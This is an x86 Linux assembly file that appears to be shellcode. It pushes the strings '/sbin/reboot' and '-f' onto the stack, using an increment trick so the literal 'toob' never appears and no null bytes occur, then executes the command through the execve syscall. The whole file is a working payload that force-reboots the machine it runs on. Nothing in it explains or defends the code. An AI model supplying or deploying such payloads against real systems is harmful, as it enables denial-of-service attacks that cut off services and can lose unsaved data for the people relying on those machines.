section .text

global _start

  _start:
    xor eax,eax    						; zero out eax
    push eax        
    mov ebx, 0x746f6f61  
    inc ebx           					; set to 0x746f6f62 - toob
    push ebx           
    mov dword [esp-4], 0x65722f6e 		; put er/n at stack top -4
    mov dword [esp-8], 0x6962732f       ; put ibs/ at stack top -8
    sub esp, 8
    mov ebx,esp    						; move stack pointer to reboot string
    push eax        
    push word 0x662d  					; f-
    mov esi,esp    						; pointer to above
    push eax        
    push esi         					; place pointer on stack
    push ebx        					; place pointer to reboot string
    mov ecx,esp    
    mov al,0xb     						; syscall for execve
    int 0x80       						; execute
